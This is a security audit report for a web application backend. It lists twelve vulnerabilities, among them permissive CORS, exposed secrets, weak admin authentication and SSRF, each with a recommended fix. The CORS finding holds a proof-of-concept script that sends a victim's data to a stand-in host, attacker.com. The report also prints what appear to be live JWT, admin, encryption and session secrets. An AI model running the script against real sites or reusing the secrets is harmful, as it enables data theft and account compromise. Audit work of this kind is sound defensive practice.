# Security Audit Report
**Date:** 2026-01-09  
**Scope:** Full-stack application security assessment

## Executive Summary

This security audit identified **12 critical and high-severity vulnerabilities** that require immediate attention. The application has good security foundations (encryption, rate limiting, input sanitization) but several critical misconfigurations and missing protections.

---

## 🔴 CRITICAL VULNERABILITIES

### 1. **Permissive CORS in Production**
**Severity:** CRITICAL  
**Location:** `backend.env` line 28, `backend/server-modular.ts` lines 113-142

**Issue:**
```env
ALLOWED_ORIGINS=
```
Empty `ALLOWED_ORIGINS` allows **any origin** to make authenticated requests with credentials.

**Impact:**
- Any malicious website can make authenticated API calls on behalf of users
- CSRF attacks can steal user data and perform actions
- Credentials (cookies, tokens) can be sent to any origin

**Proof of Concept:**
```html
<!-- Attacker's website -->
<script>
fetch('https://your-api.com/api/user/credits', {
  method: 'POST',
  credentials: 'include', // Sends cookies/tokens
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ walletAddress: 'attacker_wallet' })
}).then(r => r.json()).then(data => {
  // Steal user data
  fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
});
</script>
```

**Fix:**
```env
ALLOWED_ORIGINS=https://seisoai.com,https://www.seisoai.com
```

---

### 2. **Secrets Exposed in Version Control**
**Severity:** CRITICAL  
**Location:** `backend.env` (entire file)

**Issue:**
All secrets are in plain text in `backend.env`:
- `JWT_SECRET=ce5e025b87ce0e56c625dbb7045032b9f29ecac8478cf9a7789c58695e585e08`
- `ADMIN_SECRET=30df28efd892d65081b26652cedb7a26dcfa6d3e79067e2c0fff8a5977458f00`
- `ENCRYPTION_KEY=204fe3f6ea557f030400e250e95c9044dcb9d9b94807ae926b818e2098b0cf08`
- `SESSION_SECRET=a981f12bcfe1ab344a8ac46fcfcade97a629de1f1c248ed2`

**Impact:**
- If `backend.env` is committed to git, all secrets are compromised
- Attackers can forge JWT tokens
- Attackers can decrypt all encrypted data
- Admin access can be gained

**Fix:**
1. Add `backend.env` to `.gitignore`
2. Rotate all secrets immediately
3. Use environment variables from deployment platform (Railway, etc.)
4. Never commit secrets to version control

---

### 3. **Weak Admin Authentication**
**Severity:** CRITICAL  
**Location:** `backend/routes/admin.ts` lines 42-64

**Issue:**
Admin authentication only checks if `ADMIN_SECRET` matches. No rate limiting on admin routes beyond general rate limiter.

**Vulnerabilities:**
- Secret can be sent in request body (line 51): `req.body.adminSecret`
- No brute force protection beyond general rate limiter
- Secret is short (32 hex chars = 16 bytes)

**Impact:**
- Brute force attacks possible
- Secret leakage in logs/body

**Fix:**
```typescript
// Only accept secret in Authorization header, never in body
const providedSecret = authHeader?.replace('Bearer ', '');
if (!providedSecret || providedSecret !== ADMIN_SECRET) {
  // Log failed attempts with exponential backoff
}
```

---

### 4. **Unauthenticated User Information Disclosure**
**Severity:** HIGH  
**Location:** `backend/routes/user.ts` lines 34-71

**Issue:**
`POST /api/user/info` endpoint doesn't require authentication and returns user data based on any identifier:

```typescript
router.post('/info', async (req: Request, res: Response) => {
  const { walletAddress, userId, email } = req.body;
  const user = await findUserByIdentifier(walletAddress, email, userId);
  // Returns: userId, email, walletAddress, credits, etc.
});
```

**Impact:**
- Anyone can enumerate users by trying wallet addresses, emails, or userIds
- User privacy violation
- Credits balance disclosure

**Fix:**
- Require authentication OR
- Only return public data (wallet address, isNFTHolder) without credits/email

---

### 5. **Gallery Access Control Bypass**
**Severity:** HIGH  
**Location:** `backend/routes/user.ts` lines 162-197

**Issue:**
`POST /api/user/gallery` uses `authenticateFlexible` but then allows querying ANY user's gallery:

```typescript
router.post('/gallery', authMiddleware, async (req: Request, res: Response) => {
  const { walletAddress, userId, email } = req.body;
  const user = await findUserByIdentifier(walletAddress, email, userId);
  // Returns gallery of ANY user, not just authenticated user
});
```

**Impact:**
- Authenticated users can view any other user's gallery
- Privacy violation

**Fix:**
```typescript
// Only return gallery for authenticated user
if (req.user && (req.user.userId !== user.userId)) {
  return res.status(403).json({ error: 'Unauthorized' });
}
```

---

## 🟡 HIGH SEVERITY VULNERABILITIES

### 6. **Missing CSRF Protection**
**Severity:** HIGH  
**Location:** Entire application

**Issue:**
No CSRF tokens or SameSite cookie protection visible. With permissive CORS, CSRF attacks are trivial.

**Impact:**
- Malicious sites can perform actions on behalf of users
- State-changing operations vulnerable

**Fix:**
- Implement CSRF tokens OR
- Use SameSite=Strict cookies (if using cookies)
- Restrict CORS properly (fixes #1)

---

### 7. **SSRF Risk in Video Metadata Fetch**
**Severity:** HIGH  
**Location:** `backend/utils/videoMetadata.ts` lines 62, 76, 154

**Issue:**
`fetch(videoInput)` is called without URL validation. If `videoInput` comes from user input, SSRF is possible.

**Impact:**
- Attackers can make requests to internal services
- Port scanning
- Access to internal APIs

**Fix:**
```typescript
// Validate URL before fetching
if (!isValidFalUrl(videoInput) && !videoInput.startsWith('data:')) {
  throw new Error('Invalid video URL');
}
```

---

### 8. **Rate Limiting Bypass via Multiple IPs**
**Severity:** MEDIUM  
**Location:** `backend/middleware/rateLimiter.ts`

**Issue:**
Rate limiting is IP-based. Attackers can use:
- VPN/proxy rotation
- Botnets
- Multiple devices

**Impact:**
- Brute force attacks
- DDoS
- Resource exhaustion

**Fix:**
- Add browser fingerprinting (already exists for free images)
- Implement account-based rate limiting
- Use CAPTCHA after failed attempts

---

### 9. **No Input Validation on RPC Endpoints**
**Severity:** MEDIUM  
**Location:** `backend/routes/rpc.ts`

**Issue:**
RPC endpoints accept user-provided URLs and chain IDs without strict validation.

**Impact:**
- SSRF attacks
- Resource exhaustion
- Access to internal services

**Fix:**
- Whitelist allowed RPC URLs
- Validate chain IDs against known list
- Add request timeouts

---

### 10. **JWT Token Expiration Too Long**
**Severity:** MEDIUM  
**Location:** `backend/routes/auth.ts` lines 137, 230

**Issue:**
Access tokens expire in 24 hours, refresh tokens in 30 days.

**Impact:**
- Stolen tokens remain valid for extended periods
- No way to revoke tokens except blacklist (memory-only)

**Fix:**
- Reduce access token to 1 hour
- Implement refresh token rotation
- Store blacklist in Redis (persistent)

---

## 🟢 MEDIUM/LOW SEVERITY

### 11. **Error Messages Leak Information**
**Severity:** LOW  
**Location:** Multiple routes

**Issue:**
Some error messages reveal system internals:
- "User not found" vs "Invalid credentials" (user enumeration)
- Stack traces in development mode

**Fix:**
- Use generic error messages in production
- Log detailed errors server-side only

---

### 12. **Missing Security Headers**
**Severity:** LOW  
**Location:** `backend/server-modular.ts`

**Issue:**
Some security headers are disabled for compatibility:
- `xFrameOptions: false`
- `crossOriginOpenerPolicy: { policy: "unsafe-none" }`

**Impact:**
- Clickjacking attacks
- XSS via window.opener

**Note:** These are disabled for in-app browser compatibility. Consider if this is necessary.

---

## ✅ GOOD SECURITY PRACTICES FOUND

1. ✅ **Field-level encryption** for sensitive data (emails, prompts)
2. ✅ **NoSQL injection protection** via `deepSanitize`
3. ✅ **Password hashing** with bcrypt (12 rounds)
4. ✅ **Rate limiting** on critical endpoints
5. ✅ **Input sanitization** middleware
6. ✅ **JWT token blacklisting** for logout
7. ✅ **URL validation** for fal.ai endpoints (SSRF protection)
8. ✅ **Body-based auth disabled** (was a vulnerability, now fixed)

---

## IMMEDIATE ACTION ITEMS

### Priority 1 (Fix Immediately):
1. ✅ Set `ALLOWED_ORIGINS` in production
2. ✅ Ensure `backend.env` is in `.gitignore`
3. ✅ Rotate all secrets if `backend.env` was ever committed
4. ✅ Fix gallery access control
5. ✅ Add authentication to `/api/user/info`

### Priority 2 (Fix This Week):
6. ✅ Implement CSRF protection
7. ✅ Add SSRF validation to video metadata
8. ✅ Strengthen admin authentication
9. ✅ Reduce JWT token expiration times

### Priority 3 (Fix This Month):
10. ✅ Improve rate limiting (fingerprinting, account-based)
11. ✅ Add security headers where possible
12. ✅ Implement refresh token rotation

---

## Testing Recommendations

1. **Penetration Testing:**
   - Test CORS bypass with malicious origin
   - Attempt SSRF via video/image URLs
   - Try NoSQL injection in all endpoints
   - Test admin secret brute force

2. **Automated Scanning:**
   - Run OWASP ZAP or Burp Suite
   - Check dependencies for vulnerabilities (`npm audit`)
   - Scan for exposed secrets in git history

3. **Code Review:**
   - Review all user input handling
   - Verify authentication on all state-changing endpoints
   - Check authorization (users can only access their own data)

---

## Conclusion

The application has a solid security foundation but **critical misconfigurations** (CORS, exposed secrets) must be addressed immediately. The most urgent issue is the permissive CORS configuration combined with exposed secrets, which could lead to complete system compromise.

**Risk Level:** 🔴 **HIGH** - Immediate action required

